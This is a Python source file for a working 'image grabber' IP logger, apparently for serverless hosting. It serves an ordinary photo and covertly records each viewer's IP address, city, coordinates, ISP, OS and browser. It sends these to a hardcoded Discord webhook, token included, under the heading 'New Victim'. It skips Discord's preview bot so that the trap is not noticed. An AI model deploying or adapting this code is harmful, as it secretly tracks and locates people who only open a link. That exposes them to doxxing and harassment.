from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser
import json
from datetime import datetime
import socket
import threading
import os
import traceback

# Configuration - use environment variables for serverless deployment
WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1411802910928666796/rEpOvJWFfEWb0Wzn1MChqebZvcmgRjwL9ldGLKEgiKavz1tuV5L1QGC16ZM8O73J-p_g')
IMAGE_URL = os.environ.get('LOGGER_IMAGE_URL', 'https://images.pexels.com/photos/158827/field-corn-air-frisch-158827.jpeg?cs=srgb&dl=pexels-pixabay-158827.jpg&fm=jpg')

# Download the image once at startup (with error handling)
IMAGE_DATA = None
try:
    response = httpx.get(IMAGE_URL, timeout=10)
    if response.status_code == 200:
        IMAGE_DATA = response.content
        print("Successfully downloaded custom image")
    else:
        # Fallback to a transparent pixel if download fails
        IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')
        print("Failed to download custom image, using fallback")
except Exception as e:
    print(f"Error downloading image: {e}")
    IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')

class IPLoggerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress server logs
        return
    
    def do_GET(self):
        try:
            # Parse query parameters
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            
            # Get client IP address
            ip = self.get_client_ip()
            
            # Get user agent
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Parse user agent
            os, browser = self.parse_user_agent(user_agent)
            
            # Get referrer
            referrer = self.headers.get('referer', 'Direct')
            
            # Get request time
            timestamp = datetime.now().isoformat()
            
            # Get additional information
            additional_info = self.get_additional_info(ip)
            
            # Check if it's a Discord preview
            is_discord_preview = 'discord' in user_agent.lower() or 'discordbot' in user_agent.lower()
            
            # Send the appropriate response
            if is_discord_preview:
                # For Discord preview, send the image without logging
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(IMAGE_DATA)
                print("Served image to Discord preview")
            else:
                # For real users, send the image and log the information
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(IMAGE_DATA)
                
                # Send data to Discord in a separate thread to avoid blocking
                thread = threading.Thread(
                    target=self.send_to_discord,
                    args=(ip, user_agent, os, browser, referrer, timestamp, additional_info)
                )
                thread.daemon = True  # Make thread a daemon so it doesn't block server shutdown
                thread.start()
                
        except Exception as e:
            print(f"Error in do_GET: {e}")
            print(traceback.format_exc())
            # Still try to send the image even if logging fails
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(IMAGE_DATA)
            except:
                pass

    def get_client_ip(self):
        """Extract client IP from headers, accounting for proxies"""
        # Try common proxy headers
        for header in ['x-forwarded-for', 'x-real-ip', 'x-client-ip', 'client-ip', 'cf-connecting-ip']:
            if header in self.headers:
                ips = self.headers[header].split(',')
                return ips[0].strip()  # Get the first IP in the chain
        
        # Fall back to direct connection
        return self.client_address[0] if hasattr(self, 'client_address') else 'Unknown'

    def parse_user_agent(self, user_agent):
        """Parse user agent string"""
        try:
            parsed = httpagentparser.detect(user_agent)
            os = parsed.get('os', {}).get('name', 'Unknown')
            browser = parsed.get('browser', {}).get('name', 'Unknown')
            return os, browser
        except:
            return 'Unknown', 'Unknown'

    def get_additional_info(self, ip):
        """Get additional information about the IP"""
        if ip == 'Unknown':
            return {
                'city': 'Unknown',
                'region': 'Unknown',
                'country': 'Unknown',
                'loc': 'Unknown',
                'org': 'Unknown',
                'postal': 'Unknown',
                'timezone': 'Unknown',
                'hostname': 'Unknown'
            }
            
        try:
            # Try to get info from ipinfo.io
            response = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'loc': data.get('loc', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'postal': data.get('postal', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        except Exception as e:
            print(f"Error getting IP info: {e}")
        
        # Fallback if ipinfo.io fails
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = 'Unknown'
            
        return {
            'city': 'Unknown',
            'region': 'Unknown',
            'country': 'Unknown',
            'loc': 'Unknown',
            'org': 'Unknown',
            'postal': 'Unknown',
            'timezone': 'Unknown',
            'hostname': hostname
        }

    def send_to_discord(self, ip, user_agent, os, browser, referrer, timestamp, additional_info):
        """Send collected information to Discord webhook"""
        # Create a map emoji for the location
        country_flag = f":flag_{additional_info['country'].lower()}:" if additional_info['country'] != 'Unknown' and len(additional_info['country']) == 2 else ":question:"
        
        embed = {
            "username": "PL4ys Logger",
            "avatar_url": "https://i.imgur.com/6e5kYp0.png",
            "content": "@everyone",
            "embeds": [
                {
                    "title": "🚨 PL4ys Logger - New Victim",
                    "color": 0xff0000,
                    "timestamp": timestamp,
                    "thumbnail": {
                        "url": IMAGE_URL
                    },
                    "footer": {
                        "text": "PL4ys Logger • Your digital watchman",
                        "icon_url": "https://i.imgur.com/6e5kYp0.png"
                    },
                    "fields": [
                        {
                            "name": "🌐 IP Address",
                            "value": f"```{ip}```",
                            "inline": True
                        },
                        {
                            "name": f"{country_flag} Location",
                            "value": f"**City:** {additional_info['city']}\n**Region:** {additional_info['region']}\n**Country:** {additional_info['country']}\n**ZIP:** {additional_info['postal']}",
                            "inline": True
                        },
                        {
                            "name": "📊 Network Info",
                            "value": f"**ISP:** {additional_info['org']}\n**Coordinates:** {additional_info['loc']}\n**Timezone:** {additional_info['timezone']}",
                            "inline": True
                        },
                        {
                            "name": "💻 System Info",
                            "value": f"**OS:** {os}\n**Browser:** {browser}",
                            "inline": True
                        },
                        {
                            "name": "🔗 Referrer",
                            "value": referrer[:100] + "..." if len(referrer) > 100 else referrer,
                            "inline": True
                        },
                        {
                            "name": "📱 User Agent",
                            "value": f"```{user_agent[:400]}```" if len(user_agent) > 400 else f"```{user_agent}```",
                            "inline": False
                        }
                    ]
                }
            ]
        }
        
        try:
            response = httpx.post(WEBHOOK_URL, json=embed, timeout=10)
            if response.status_code == 204:
                print("Successfully sent data to Discord")
            else:
                print(f"Discord API returned status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send to Discord: {e}")

# Serverless function handler (for AWS Lambda, Vercel, etc.)
def handler(event, context):
    """Serverless function handler"""
    try:
        # Extract information from the event
        request_method = event.get('httpMethod', 'GET')
        headers = {k.lower(): v for k, v in event.get('headers', {}).items()}
        query_params = event.get('queryStringParameters', {}) or {}
        
        # Create a mock request handler
        class MockRequest:
            def __init__(self, path, headers):
                self.path = path
                self.headers = headers
        
        # Create a mock response writer
        class MockResponse:
            def __init__(self):
                self.status_code = 200
                self.headers = {}
                self.body = b''
            
            def write(self, data):
                self.body += data
            
            def set_header(self, key, value):
                self.headers[key] = value
            
            def set_status(self, code):
                self.status_code = code
        
        # Build the path with query parameters
        path = event.get('path', '/')
        if query_params:
            path += '?' + '&'.join([f"{k}={v}" for k, v in query_params.items()])
        
        # Create mock objects
        mock_request = MockRequest(path, headers)
        response = MockResponse()
        
        # Create handler instance
        handler_instance = IPLoggerHandler(mock_request, ('0.0.0.0', 80), None)
        handler_instance.wfile = response
        
        # Call the do_GET method
        handler_instance.do_GET()
        
        # Return the response
        return {
            'statusCode': response.status_code,
            'headers': {
                'Content-Type': 'image/jpeg',
                **response.headers
            },
            'body': base64.b64encode(response.body).decode('utf-8'),
            'isBase64Encoded': True
        }
    
    except Exception as e:
        print(f"Error in serverless handler: {e}")
        print(traceback.format_exc())
        return {
            'statusCode': 500,
            'body': json.dumps({'error': 'Internal server error'})
        }

# For local testing
if __name__ == '__main__':
    from http.server import HTTPServer
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        PORT = int(os.environ.get('PORT', 8080))
        server = HTTPServer(('0.0.0.0', PORT), IPLoggerHandler)
        print(f"PL4ys Logger server running on 0.0.0.0:{PORT}")
        print(f"Using image from: {IMAGE_URL}")
        print("Press Ctrl+C to stop the server")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")
            server.shutdown()
    else:
        print("This script is designed for serverless deployment.")
        print("For local testing, run: python script.py local")
